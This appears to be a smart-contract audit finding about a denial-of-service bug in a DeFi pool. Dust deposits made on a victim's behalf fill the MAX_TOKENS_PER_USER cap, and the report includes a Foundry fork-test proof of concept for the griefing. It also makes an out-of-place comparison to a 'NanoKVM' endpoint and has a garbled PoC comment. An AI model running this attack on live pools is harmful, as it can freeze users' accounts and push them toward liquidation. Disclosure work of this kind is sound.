### Title
Unauthenticated dust deposits/transfers exhaust `MAX_TOKENS_PER_USER` slots and block a victim from adding new collateral or debt tokens - ([File: contracts/Pool.sol](contracts/Pool.sol))

### Summary
`Pool.addToDepositTokensOfAccount` / `Pool.addToDebtTokensOfAccount` are callable by any registered token with no check that `account_` consented. Any EOA can force entries into a victim's per-account token list by sending dust `DepositToken` transfers or dust `deposit(amount_, onBehalfOf_ = victim)` calls. Once the combined `debtTokensOfAccount` + `depositTokensOfAccount` length reaches `MAX_TOKENS_PER_USER = 30`, every subsequent addition reverts with `UserReachedMaxTokens`, permanently blocking the victim from onboarding new collateral or debt positions in that pool.

### Finding Description
In `contracts/Pool.sol`, the per-account token lists are capped:

```solidity
// contracts/Pool.sol:79
uint256 public constant MAX_TOKENS_PER_USER = 30;

// contracts/Pool.sol:143-148
modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
    if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
        revert UserReachedMaxTokens();
    }
    _;
}

// contracts/Pool.sol:204-220
function addToDebtTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) { ... }
function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) { ... }
```

The only authorization is that `msg.sender` is a registered deposit/debt token — the victim (`account_`) never opts in. In `contracts/DepositToken.sol`, both `_transfer` (line 518-519) and `_mint` (line 486-487) call `pool.addToDepositTokensOfAccount(recipient_)` whenever the recipient's balance was zero. `DepositToken.deposit` (line 211) accepts an arbitrary `onBehalfOf_`, and `transfer`/`transferFrom` are public ERC20 entry points.

An attacker deposits a 1-wei-equivalent dust amount of each underlying via `deposit(1, victim)` for every deposit token in the pool (or transfers dust `DepositToken`s after depositing to themselves). Each call pushes a new entry into `depositTokensOfAccount[victim]` until the 30-slot cap is hit.

### Impact Explanation
Once saturated, the victim's account is "configured" with attacker-chosen token entries — a direct analog to the NanoKVM unauthenticated config endpoint:

- `deposit` of any *new* collateral type reverts in `_mint` → `addToDepositTokensOfAccount` → `UserReachedMaxTokens`. The victim cannot diversify or add the collateral type that would save their position.
- `DebtToken.issue` → `mint` (which calls `addToDebtTokensOfAccount` when balance goes from 0) reverts for any synthetic asset the victim doesn't already hold, blocking new borrows.
- If the victim has outstanding debt, `unlockedBalanceOf` may return less than the dust amount (or 0), so `transfer`/`withdraw` of the dust reverts in `_revertIfLocked` (DepositToken.sol:180-182) and the entries can't be cleared — the freeze persists until the victim repays enough debt, which may be impossible if they can't deposit new collateral. This leads to avoidable liquidation / temporary-to-permanent freezing of the account's ability to manage risk.

### Likelihood Explanation
- Fully unauthenticated: requires only dust amounts of each underlying (~30 × minimal deposit) and standard public entry points — no privileged role, oracle manipulation, or flash loan needed.
- Most effective against accounts with active debt near the collateral factor boundary, where `unlockedBalanceOf` returns ~0 and dust cannot be transferred back out.
- Cost scales linearly with the number of deposit tokens registered; pools with many collaterals are cheapest to grief.
- Partially self-healing for debt-free victims (they can transfer dust away), but for indebted victims the removal path itself reverts, making the DoS sticky.

### Recommendation
- Make `addToDepositTokensOfAccount`/`addToDebtTokensOfAccount` revert only on *new-position-creating* actions initiated by the account (or track slots only when the action is initiated by `SynthContext._msgSender() == account_`), so force-fed dust doesn't consume the cap.
- Alternatively, exempt entries whose balance is below a dust threshold from the `MAX_TOKENS_PER_USER` count, or let any account purge zero/dust entries from its own list.
- At minimum, allow `DepositToken.transfer`/`transferFrom` of dust received passively (skip `_revertIfLocked` when the sender never consented to the position), so victims can always eject attacker-pushed tokens.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// Fork test against a deployed Pool (e.g. mainnet Pool with N deposit tokens).
// Assumes: pool registered, depositTokens[] registered, underlying whale or attacker funds.

function test_maxTokensGriefing(address victim) public {
    // victim has an open position: deposited collateral A, issued msUSD debt
    _setupVictimPosition(victim);

    IDepositToken[] memory dTokens = pool.getDepositTokens(); // registered collaterals
    uint256 max = pool.MAX_TOKENS_PER_USER(); // 30

    // Attacker force-feeds dust deposits to the victim for every deposit token
    for (uint256 i; i < dTokens.length && pool.depositTokensOfAccountLength(victim) < max; ++i) {
        IDepositToken dt = dTokens[i];
        if (dt.balanceOf(victim) > 0) continue; // already counted
        IERC20 underlying = dt.underlying();
        deal(address(underlying), attacker, 1);
        vm.startPrank(attacker);
        underlying.approve(address(dt), 1);
        dt.deposit(1, victim); // _mint -> pool.addToDepositTokensOfAccount(victim)
        vm.stopPrank();
    }
    // If slots remain, attacker mints dust debt-token entries are not needed;
    // combination of debt+deposit entries >= 30 reaches the cap.

    assertGe(pool.getDepositTokensOfAccount(victim).length
             + pool.getDebtTokensOfAccount(victim).length, max);

    // Victim now cannot deposit a collateral type it doesn't already hold
    IDepositToken newToken = _registerFreshDepositToken(); // governor adds new collateral
    IERC20 newUnderlying = newToken.underlying();
    deal(address(newUnderlying), victim, 100e18);
    vm.startPrank(victim);
    newUnderlying.approve(address(newToken), 100e18);
    vm.expectRevert(UserReachedMaxTokens.selector);
    newToken.deposit(100e18, victim);
    vm.stopPrank();

    // Victim cannot even shed the dust while undercollateralized:
    // unlockedBalanceOf(victim) == 0 -> dt.transfer reverts NotEnoughFreeBalance,
    // so the attacker-written entries persist until debt is repaid.
}
```

This reproduces on a mainnet fork of any deployed `Pool` using only unauthenticated calls (`deposit`/`transfer`), matching the NanoKVM pattern: an unauthenticated request path lets an attacker write another principal's stored configuration and exhaust a fixed resource to disable core functionality.
